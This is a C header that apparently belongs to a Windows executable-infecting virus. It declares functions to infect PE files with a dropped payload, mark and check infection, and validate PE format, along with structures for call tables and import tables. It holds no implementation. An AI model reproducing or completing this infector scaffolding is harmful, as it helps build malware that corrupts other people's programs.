#pragma once
#include "common.h"
#include "mem.h"

#define MAX_SIZE_FILE 0x10000000
#define MIN_SIZE_DECRYPT 0x180//0xC0
int infect(cmem &bf,cmem &drop,cmem *out);
bool mem_valid(cmem *b,uint8* p,uint32 align);
bool check_infected(cmem *b);
bool set_infected(cmem *b, bool fexec = true);
bool check_pe(cmem *b);
#pragma pack(push,1)
struct ITEM_CALL{
	uint32 offset;
	uint32 rva;
	uint32 offset_in;
	uint32 rva_in;
	uint32 len_func;
};

struct LIST_CALL{
	uint32 count;
	ITEM_CALL *list;
};

struct BLOCK_FILE{
	uint32 size;
	uint8 *data;
	uint32 offset;
	uint32 rva;
};

struct IMPORT_TABLE{
    uint32 OriginalFirstThunk;
    uint32 TimeDateStamp;
    uint32 ForwarderChain;
    uint32 Name;
    uint32 FirstThunk;
};

#pragma pack(pop)